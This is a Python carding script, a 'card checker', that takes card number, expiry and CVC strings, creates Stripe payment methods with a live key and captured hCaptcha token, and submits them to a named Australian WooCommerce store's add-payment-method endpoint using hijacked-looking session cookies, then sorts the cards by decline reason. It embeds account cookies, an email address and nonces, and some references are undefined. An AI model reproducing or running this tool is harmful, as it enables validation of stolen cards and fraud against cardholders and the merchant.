import requests,re
import random
def ChargeTele(ccx):
	import requests
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=hafezg93%40gmail.com&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=528163a2-5f5f-4935-8da2-bad2f648be5ee44630&muid=ac58cdd5-0014-4cf9-8dcb-acf0d0ba76e08a9377&sid=a8867564-4104-4517-a2db-89141fea5e1c704315&pasted_fields=number&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+split-card-element&referrer=https%3A%2F%2Fwww.tileclearanceoutlet.net.au&time_on_page=21249&key=pk_live_cD8FTDUrewPjeBboKoP83jPv00s0yQVH49&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSkFsYWZsa3BjRGJDN09jRHhhNlhlZkRUVktaQS81a3BlTUk2NDFtNGdUSlQzeVh0UHdQcUZKVmJsMXRnWlhjeURXTXh5OGNkcHoyeGxwRmh3L1BIT1pDS0lkMHphZUZpak9vOFRPMTE0dHFSemlqb2labTNyS0JkWml1YWtZck9HamRzaFo0TjYxanQvRWxJNlQyZjZ0TGdFTWRIdnRISFpvZVpBdkFacnhNbWZFQkVmRHdMbHRuejI3aHlOUFVqeTdMMnU0YUFyeHNzL1RKcGxuTmFrM0pFM3piM2U3dzF0UjB6VzRFaG03b011MzV0czhhUEM0S0QxektrcDcwamFXK0w0WWc0UkdOdGVIaFFoOHZBT1pSOStvRkd3cjBkRHRuVTQwT1ZnRUtCclBPUWVLQTRmOCsvL2podG11Mis5TXFUVEIzeGpSZ0Eyakl0N2M2WWhLSnBtOUlHRlFrN0ZHNVV3dG9Nbks5TE5vWCtjamxtcitvUGxJeHpyRG9iYWpMUEFMMUUrQ0k1MGpBZEgrT2hMNnFVcXpyUVhvSXoraVdIYzN4aFlBWUpmVGEyR3Vwb05ubGVFaFUxbDlYMy83S2E0Uzc0bEdZVkYvcmE0S1UrYnZ4OEZPNm93TnE4bDFaelZsK0QwcDVCdHd0eXdNNFJ2bUtUNzFDY1RFTjNlM1lMejlubVNYR1lLc3c1Rm1NQUUzUkd4RGFjRldMY242cFEraytUSWl0ekQzNUh3Z0Z0MkRQK3Voa3UvaW5HUFVvWU43WnNsQStCVjJiV1J6ZEtLRzEzL3YyMHg4N0lmcnA5UElzNnltN3RCelBGdXBDWFlHM0J2R2Q0OVFkYlMvLzN1MFg2NktScmkwcFJZd1NXSGZTTndqYjVIOGUyT3llcW82T2N4Ny9penlPVEJ1VENnQjV5YnEvbDRGbUJSUXlob0VscFdHVXZsUGVuUk5RN0pNaUY1OWVsdDZ2NFFTd0cxNnp5ckJpa0hVM1FNdUdPY3kwSFNTRGdicFJtUE1OTm5TZkFLd1JLYnduZC9scEFsVWRoTlQ5VE9tUmh3Z2ZOQytDaXdPa2VHZ2p3TDBpVVd1VlU3UWZnNzZYOE9zUFFmM1NDdGJMc1R0aVo5V0ZBT3ZMek5tS0xBY254cTZ3WGJFT2UwRS9QQk02Q3dyNlNJcDZzMzRRRzdvc1ROTVBpd3FPcDBVU2Y5ZWU0Q0JiWklhaG04NzdnNFBMZmVoNHMrM0U1NDl4aXhUMnM5S2ZPb2FqQXNPbEc0VjJwYUJkMU9FWW9zOXFmOEUvUFFMZmV1Zm94NVNsQnZjajkwR09YVEQ4S2VQUm5YMVlHY1NpOUNDcG1OckFpWG5vZ2ZIYnFEemFLLzB5RUdKazcwN1Z5YnJiNVZDQ0V4dnVaZVZvaStOVkszVHJYRlpUR3hkSlZsaXJ3bmRuZkRWQ081RG52cnMwbEJDOVphbGVqV1loWS9OU251RjJFTWwxN1dzdmhYWWJ2R3VEekF1alV3emdxdyt6MlZ6M3pWd1NNWVVRY2dKYkRQMVpKNVBvY0R6bUQ1TE5jWHpXQnh2blpRWWs4NFVhcDkySVQ1VTNicWx5dlZRYUc5aHYwajFVajF3QTRtYXdqLy9wVkFuR0xtMUc2bXZLdm1XMVV3dnZja2Z5dWl3RDI5ckpYbXJPYVNEb1lxbFpiTGoyRExxdmNucFdZTnBieGYzY1IwcjU4WXRkQUNGbHRtZERhMGZVcEd5bGd6a3V5QytBdlJoZGJyc2lKUUZDNERDWXZHdFJkRWNHd0YxS0IvT3BtTzY1LzlOWjZ1a0MvdUM0L2t5ZSt4eUdreEdEaHZ1VkpsY1JyYUFRbTdXb0hYaWdtZmc0aUUvZ1Fkb3pkTVBwZCtDVGo5TVBXUWJ4WVk2aG52WTVTNzk1RmdyZDNLT29vYVZRNHB4V2JXOVpZZXNnTVg2MlU1RXh2aHk5VHhlVDlWZ2dnelFjalM1ajJ2ekFlZjZ3aHJBYUtJU1hNcjVYdlQ1dkZqR28welBxQXlHWVIxZm8vT3VLT3BlTjJGSTdvcDZSaHA2aHdNajNURkJ3TE9hRGtzUURrbGhKWkpibkpHSGxYOFRLclVIajlITUxzbGlhVlVuMG1PUEpsZWNZd1VaR2o0Rk84V096dy9JdHpEcXE0RGhkQVdNWURYWDVVMEpkazRxaHAzbzRuNmhlTGIvazh2eDdUSmVLNVpQSEIvNmNJTlc3aFBGb29jdVM1SUx1MnhKVkhCMzBRY2xKakwzNXUvYjA2eGZsNzM3dUdaelRyNTVRMVE5N0pEOE5OVnB6NGNMeTV1WkZyaVJEcE9haVRvVUd2ZXNHYzZzSndaNm1QMkVUQjNIYXIvc2J3ODQ4dExvRXFHQ2hZTFlSZ2EvVGx5VHZKcTZWY1g2dVV5bW8zajFsbmVtbjRaN1JYWmh3VkkzSi9ZZm5yVFFDSUd2eERGcmF6YlZDWGtFeWpRTEJRMDlkS0xQMjdoMUFpak8rT1NWUzZRWFprSEpLLzZ3WklheVJrdDRIUUNSSVJBS3VJTlZ6QmNqOVRscXk2M2JMYkNLRGVhM2dZQitCYlJQNWp5VTJabXJScmw0eGR0RXIyZHRXZFd1Q3ZGbE1iWTk0MTVJeU1IcCtwbktaMHRUbllqV3MwWHYwdHpZaUF2Q0YvR1FqM3d6bVFZOHBkdE5tWGo4UnZvdkd1R2VjVU1lUDNiLzBkNEMyaFpIWjRWTGx2ci9BVGpxQlpSSHM2SXVRYmZCYzBpa21rdjdWcHRyZVNpZmYvN2RMek1CMTFHWFdyWXlJdU5WcnVXeGtIWGw5QitYNU8wRVl2cjZna1l1bGRZZThqN09lZ0ZNVkV0dnZBUDByRjJGM1dVZWhLQTNqSTVYVEc0M0xKNHkxRkwvUjhGTG9oNTh5cEg0NnMwaCtzS1paWUUxaW5hTENnSFluZVVZUzA0MVExdDlzMDdKMnEyNlNjYVJndWtYMTkiLCJleHAiOjE3Mjk3ODUyOTYsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIzNTFjOWY0NSIsInBkIjowLCJjZGF0YSI6InJZQmVQNlRoT3F5ZjhTSkVVOEhZZ29LOTQ3QjB2bExWaTBaQi9jSjFzQTNzeWpLc2tQdlpDallmclhBdkt6KzZ6UkdPZkttU0pPMnUzN3ljK1lwNzA2UFdwVkR2anJPbUtjeEx2ZjIvWTZ3aERmUzhxQzlaYml0aFJ6SVNvMHNzVmUrMVhTNU5zYjVSZGEzV2lRRGN0c0JiWlF4Z2V5YkV1T2xXaUZLQXJRZEd2TmJsU09Mc3hqRGk5SmJRUS9HSkZOSG5NN1VsczhIRXRvTVQifQ.gIzc4bNAJ4KIXUEnjMsz-Or-nIOkRRJ0d6zokHyMQck'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id= (response.json()['id'])
	except Exception as e:
		if "Your card has insufficient funds." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's security code is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card does not support this type of purchase." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's expiration month is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		else:
			print('f')
		return
	cookies = {
	    '_gid': 'GA1.3.1384427898.1729788111',
	    '__stripe_mid': 'ac58cdd5-0014-4cf9-8dcb-acf0d0ba76e08a9377',
	    '__stripe_sid': 'a8867564-4104-4517-a2db-89141fea5e1c704315',
	    'woocommerce_items_in_cart': '1',
	    'woocommerce_cart_hash': 'cd04170043e70ecf53a3cc0ba13f6c40',
	    'et-editor-available-post-904-fb': 'fb',
	    'wordpress_logged_in_491289770aba017e2b4ce5e0522b2437': 'hafezg93%7C1730994267%7C2fpdNi2THB9RxIBVtRiP5JBPcMxl6goJ2KQGQdlC1dU%7Ccd260d0f1307766b8e486362017ca799aa9b83593acac752de8650f4c4362981',
	    'wp_woocommerce_session_491289770aba017e2b4ce5e0522b2437': '61239%7C%7C1729957410%7C%7C1729953810%7C%7Cd8f09a1dfc95f5eef63b5313ccda08d9',
	    'wfwaf-authcookie-16c5425c41fc687049ec08e4e9158046': '61239%7Cother%7Cread%7C42f62cf7320fe2484e4916e24fd1ac465498f4c33f740e8541b151285270b06d',
	    '_ga_PNTH1X9BZQ': 'GS1.1.1729788110.1.1.1729788709.11.0.0',
	    '_ga': 'GA1.1.2090953121.1729788110',
	}
	
	headers = {
	    'authority': 'www.tileclearanceoutlet.net.au',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gid=GA1.3.1384427898.1729788111; __stripe_mid=ac58cdd5-0014-4cf9-8dcb-acf0d0ba76e08a9377; __stripe_sid=a8867564-4104-4517-a2db-89141fea5e1c704315; woocommerce_items_in_cart=1; woocommerce_cart_hash=cd04170043e70ecf53a3cc0ba13f6c40; et-editor-available-post-904-fb=fb; wordpress_logged_in_491289770aba017e2b4ce5e0522b2437=hafezg93%7C1730994267%7C2fpdNi2THB9RxIBVtRiP5JBPcMxl6goJ2KQGQdlC1dU%7Ccd260d0f1307766b8e486362017ca799aa9b83593acac752de8650f4c4362981; wp_woocommerce_session_491289770aba017e2b4ce5e0522b2437=61239%7C%7C1729957410%7C%7C1729953810%7C%7Cd8f09a1dfc95f5eef63b5313ccda08d9; wfwaf-authcookie-16c5425c41fc687049ec08e4e9158046=61239%7Cother%7Cread%7C42f62cf7320fe2484e4916e24fd1ac465498f4c33f740e8541b151285270b06d; _ga_PNTH1X9BZQ=GS1.1.1729788110.1.1.1729788709.11.0.0; _ga=GA1.1.2090953121.1729788110',
	    'origin': 'https://www.tileclearanceoutlet.net.au',
	    'referer': 'https://www.tileclearanceoutlet.net.au/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': '98312a18af',
	}
	
	req0 = requests.post('https://www.tileclearanceoutlet.net.au/', params=params, cookies=cookies, headers=headers, data=data)
	if "success" in req0.text:
		return "success"
	elif "generic_decline" in req0.text:
		code = req0.json()['error']['message']
		msg = req0.json()['error']['message']
		return str(code+":"+msg)
	elif "Your card was declined." in req0.text:
		return "Your card was declined."	
	if "Your card does not support this type of purchase." in req0.text:
		return "Your card does not support this type of purchase."	
	elif "Your card has insufficient funds." in req0.text:	
		return "Your card has insufficient funds."
	if "Your card's security code is incorrect." in req0.text:
		return "Your card's security code is incorrect."
	if "3D-AUTH" in req0.text:
		return "3D-AUTH"		
	if "Your card was declined for making repeated attempts too frequemtly or exceeding its amount limit." in req0.text:
		return "Withdrawal limit exceeded"
	if "Your card number is incorrect." in req0.text:
		return "Your card number is incorrect."
	if "Invaild account." in req0.text:
		return "Invaild account."
	else:
		try:
			code = req0.json()['error']['message']
			return code
		except:
			try:
				return req0.json()['error']['message']
			except:
				return req0.text
	 